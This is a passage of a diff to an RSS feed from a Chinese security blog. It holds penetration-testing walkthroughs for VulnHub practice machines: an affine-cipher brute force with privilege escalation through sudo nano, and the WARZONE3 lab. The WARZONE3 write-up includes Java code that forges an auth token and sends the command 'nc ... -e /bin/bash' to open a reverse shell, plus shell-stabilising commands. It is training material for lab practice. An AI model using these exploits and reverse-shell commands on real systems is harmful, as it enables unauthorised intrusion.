range(65, 91):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		for key1 in range(65, 91):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			encrypt_text = affine_encrypt(affine_text, [key0, key1])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			if encrypt_text == &amp;quot;QZA&amp;quot;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				print(key0,key1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				sys.exit(0)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1427.png&#34; width=&#34;500&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;得到 key 为（ 89 ， 65 ）之后，编写解密文件，进行解密密码&lt;/p&gt;
-&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cat &amp;gt; 2.py &amp;lt;&amp;lt; EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def affine_decrypt(cipher):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	text = []&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	for t in cipher:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		b = ord(t) - ord(&amp;#x27;A&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		for x in range(0, 26):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			result = (65 + x*89 - b) % 26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			if result == 0:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				text.append(chr(x + ord(&amp;#x27;A&amp;#x27;)))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				break&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	print(&amp;#x27;&amp;#x27;.join(text))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if __name__ == &amp;#x27;__main__&amp;#x27;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	affine_encrypted_text = &amp;quot;FAJSRWOXLAXDQZAWNDDVLSU&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	affine_decrypt(affine_encrypted_text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1428.png&#34; width=&#34;390&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;得到的密码测试之后是属于 carlos 用户的密码&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1429.png&#34; width=&#34;240&#34; alt=&#34;Image&#34;&gt;
-&lt;h3 id=&#34;sudonano提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sudonano提权&#34;&gt;#&lt;/a&gt; sudo (nano) 提权&lt;/h3&gt;
-&lt;p&gt;有了密码之后可以看到 carlos 用户权限设置&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1430.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;nano 的权限设置错误了&lt;/p&gt;
-&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查看gtfobins找到了提权命令&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo /bin/nano /opt/priv&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Ctrl + R&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Ctrl + X&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;reset; sh 1&amp;gt;&amp;amp;0 2&amp;gt;&amp;amp;0&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1431.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 成功拿到了 root 权限&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1592.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;查看 ip 地址&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1593.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 成功拿到了 root 权限，并且查看到 ip 是宿主机的 ip&lt;/p&gt;
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://www.n1h1l157.live/2021/11/01/VULNHUB/144%20CEREAL/</guid>
-            <title>VULNHUB 44 CEREAL</title>
-            <link>http://www.n1h1l157.live/2021/11/01/VULNHUB/144%20CEREAL/</link>
+            <guid isPermalink="true">http://www.n1h1l157.live/2021/11/01/VULNHUB/147%20WARZONE3/</guid>
+            <title>VULNHUB 47 WARZONE3</title>
+            <link>http://www.n1h1l157.live/2021/11/01/VULNHUB/147%20WARZONE3/</link>
             <category>VULNHUB 41-50</category>
             <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
-            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvY2VyZWFsLTEsNzAzLw==&#34;&gt;https://www.vulnhub.com/entry/cereal-1,703/&lt;/span&gt;&lt;br&gt;
- 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc2FpbmV0L3AvMTU3Nzk0MTQuaHRtbA==&#34;&gt;https://www.cnblogs.com/sainet/p/15779414.html&lt;/span&gt;&lt;/p&gt;
+            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvd2Fyem9uZS0zLWV4b2dlbiw2MDYv&#34;&gt;https://www.vulnhub.com/entry/warzone-3-exogen,606/&lt;/span&gt;&lt;/p&gt;
 &lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
-&lt;p&gt;攻击机 KALI： 192.168.31.135 (由于设置成了 DHCP、可能多变)&lt;br&gt;
- 靶机 CEREAL：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
+&lt;p&gt;攻击机 KALI： 192.168.0.135 (由于设置成了 DHCP、可能多变)&lt;br&gt;
+ 靶机 WARZONE3：桥接于 192.168.0.1 的网卡，ip 未知&lt;/p&gt;
 &lt;p&gt;1 ）确定靶机 ip 地址和开放的端口&lt;br&gt;
 由已至内网靶机所在主机 MAC 地址自动扫描靶机 ip&lt;br&gt;
  &lt;code&gt;sudo arp-scan -l | grep &#39;a0&#39; | awk &#39;&amp;#123;print $1,$2&amp;#125;&#39; | cut -d &#39; &#39; -f 1 | uniq&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1305.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;2 ）粗略的识别一下该 ip 上开放了哪些端口&lt;br&gt;
- &lt;code&gt;sudo arp-scan -l | grep &#39;a0&#39; | awk &#39;&amp;#123;print $1,$2&amp;#125;&#39; | cut -d &#39; &#39; -f 1 | xargs sudo nmap -PA&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1306.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31. 83&lt;br&gt;
- 靶机开放端口 21 , 22 , 80 , 139 , 445 , 3306 , 11111 , 55555&lt;/p&gt;
-&lt;p&gt;3 ）对靶机开放的端口做更深一步的检索，检索各个服务上的详细信息&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1307.png&#34; width=&#34;500&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;开靶机前后各扫描一次，得到靶机 ip 192.168.0.186&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1432.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;2 ）扫描靶机上开放的端口及详细信息&lt;br&gt;
+ &lt;code&gt;sudo nmap -sVC -T4 -Pn --open -p- 192.168.0.187 --min-rate=5000&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1433.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
 &lt;blockquote&gt;
-&lt;p&gt;检索到的有效服务如下所示&lt;br&gt;
- 21 ftp：可尝试进行匿名登陆下载文件&lt;br&gt;
- 22 ssh：可尝试 ssh 爆破与一些对应版本漏洞利用&lt;br&gt;
- 80 、44441 http：可对 web 进行渗透测试收集信息&lt;br&gt;
- 3306 mysql：可进行自制字典爆破或社工收集账户密码&lt;br&gt;
- 139 端口，是 NetBIOS 会话服务端口，主要用于提供 Windows 文件和打印机共享以及 UNIX 中的 Samba 服务。可进行 smb 利用。&lt;br&gt;
-445 端口，通过它可以在局域网中轻松访问各种共享文件夹或共享打印机，能通过该端口共享硬盘。&lt;/p&gt;
+&lt;p&gt;nmap 参数说明&lt;br&gt;
+ - sV 表示扫描服务及版本信息&lt;br&gt;
+ - sC 表示以默认的脚本进行扫描&lt;br&gt;
+ - T4 表示控制扫描的速度&lt;br&gt;
+ - Pn 表示不用 ping 去扫描机器&lt;br&gt;
+–open 表示只扫描开放的端口&lt;br&gt;
+ - p- 表示扫描所有的端口&lt;br&gt;
+–min-rate 设置最小的扫描速度&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;blockquote&gt;
-&lt;p&gt;注意到有很多服务名字是 tcpwrapped：&lt;br&gt;
-这说明 tcp 三次握手已经完成，但是并没有和目标主机建立连接。这表明，虽然目标主机的某项服务是可提供的，但你不在允许访问主机的名单列表中。当大量的端口服务都为 tcpwrapped 时，这说明可能是有负载均衡或者防火墙阻断了你的连接请求。&lt;/p&gt;
+&lt;p&gt;检索到的有效服务如下所示：&lt;br&gt;
+21 ftp：可尝试进行匿名登陆下载文件&lt;br&gt;
+ 22 ssh：可尝试 ssh 爆破与一些对应版本漏洞利用&lt;br&gt;
+ 4444 krb 524 ：未知端口&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;h3 id=&#34;ftp-匿名访问&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ftp-匿名访问&#34;&gt;#&lt;/a&gt; FTP 匿名访问&lt;/h3&gt;
-&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;ZnRwOi8vMTkyLjE2OC4zMS44Mw==&#34;&gt;ftp://192.168.31.83&lt;/span&gt; 进行 ftp 信息收集&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1308.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;有一个空文件夹 pub、没有更多的详细信息暴露出来&lt;/p&gt;
-&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
-&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuODMv&#34;&gt;http://192.168.31.83/&lt;/span&gt; 进行 web 信息收集&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1309.png&#34; width=&#34;530&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;ZnRwOi8vMTkyLjE2OC4wLjE4Ni8=&#34;&gt;ftp://192.168.0.186/&lt;/span&gt; 进行 ftp 信息收集&lt;br&gt;
+有一个文件夹 pub、里边有一个 jar 文件和一个 txt 文件&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1434.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;将 ftp 服务器里的这两个文件都下载到本地，可以在 ftp 命令行中使用 lcd 来控制本地的目录&lt;/p&gt;
+&lt;p&gt;note.txt 中提示 token 是 username 的 SHA 256 值，并且有一个邮箱是 alienum@exogenesis，即用户为 alienum&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1435.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
+&lt;h3 id=&#34;java代码审计&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#java代码审计&#34;&gt;#&lt;/a&gt; java 代码审计&lt;/h3&gt;
+&lt;p&gt;将下载后的 jar 文件，用 jd-gui 打开后查看源代码&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1436.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;RE 有四个量，分别是 token，option，cmd，value，以及一些继承序列化和转变为字符串、get set 方法等&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1437.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;Token 由 value 和 role 组成&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1438.png&#34; width=&#34;560&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;在 Starter 即主函数中找到了一个判断角色，当角色为 astronaut 时允许进入&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1439.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;先将这个 jar 文件执行一下，弹出来一个登陆框，随意输入信息之后报错，识别不到 url 地址为 warzone.local&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1440.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;改变本地 hosts 文件，修改其 DNS 解析地址为靶机 ip&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1441.png&#34; width=&#34;460&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;并同时将已知用户 alienum 的 SHA 256 值计算出来，此 SHA 256 值根据提示内容来说就应该是 alienum 用户的 TOKEN 值&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1442.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;也可以根据 terminal 的命令来计算，在 kali 下输入如下命令即可计算 SHA 256&lt;br&gt;
+ &lt;code&gt;echo -n &amp;quot;alienum&amp;quot; | shasum -a 256&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1443.png&#34; width=&#34;460&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;6c72561d26722d88896b520da9651aa24e9ae6eca82e6c8e68af720cf21377ec&lt;/p&gt;
+&lt;p&gt;再次用 alienum 用户和他的 token 登陆发现爆了错误&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1444.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;在看到 java 源代码的时候，知道它执行了以个 CMd 的命令，现在我们已经可以绕过登陆并且又了 token 的值，可以写一个 java 文件执行任意命令，拿出 IDEA 其他的两个文件不变，主函数改为下面的代码&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1445.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;package alien;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import java.io.IOException;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import java.io.ObjectInputStream;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import java.io.ObjectOutputStream;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import java.net.Socket;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;public class Starter &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	static Socket socket = null;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	static ObjectOutputStream os;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	static Token token;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	public static void main(String[] args) throws IOException, ClassNotFoundException &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		socket = new Socket(&amp;quot;warzone.local&amp;quot;, 4444);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		os = new ObjectOutputStream(socket.getOutputStream());&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		token = new&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		Token(&amp;quot;6c72561d26722d88896b520da9651aa24e9ae6eca82e6c8e68af720cf21377ec&amp;quot;, &amp;quot;astronaut&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		RE list = new RE();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		list.setToken(token);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		list.setOption(&amp;quot;VIEW&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		list.setValue(&amp;quot;VALUE&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		list.setCmd(&amp;quot;nc 192.168.0.168 4444 -e /bin/bash&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		os.writeObject(list);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		ObjectInputStream is = new ObjectInputStream(socket.getInputStream());&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		RE response = (RE) is.readObject();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		os.close();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		socket.close();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		System.out.println(response.getValue());&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;执行之后 shell 成功反弹，拿到了 exomorph 的权限&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1446.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
+&lt;h3 id=&#34;java脚本解密aes&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#java脚本解密aes&#34;&gt;#&lt;/a&gt; java 脚本解密 AES&lt;/h3&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;标准化&lt;span class=&#34;built_in&#34;&gt;tty&lt;/span&gt;就不多说了&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;script -qc /bin/bash /dev/null&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stty raw -echo;fg&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;export TERM=xterm;reset;stty rows 64 columns 118&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;此用户下有两个文件，cat 发现乱码，file 检查文件属性，strings 查看内容&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1447.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;得到了一个密码，和一个 jar 文件，将 jar 文件拉到本地导入到 jd-gui&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1448.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;CrypoException 是一个普通的类&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1449.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;Cryptor 是一个 AES 加密文件，加密过程中会调用这个里边的方法&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1450.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;Main 函数定义要加密的 key，以及加密后的文件的路径&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1451.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;现在就用来写一个解密文件，用来将我们得到的密码 $:2Czq$(解密&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;先定义解密函数，通过如下方法来调用&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;public static void decrypt(String key, File inputFile, File outputFile) throws CryptoException &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	doCrypto(Cipher.DECRYPT_MODE, key, inputFile, outputFile);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1452.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;再来修改主函数，密钥维持不变，修改当前的解密文件内容和解密后的文件保存路径，并且调用解密方法，最后将我们解密后的内容查看&lt;/p&gt;
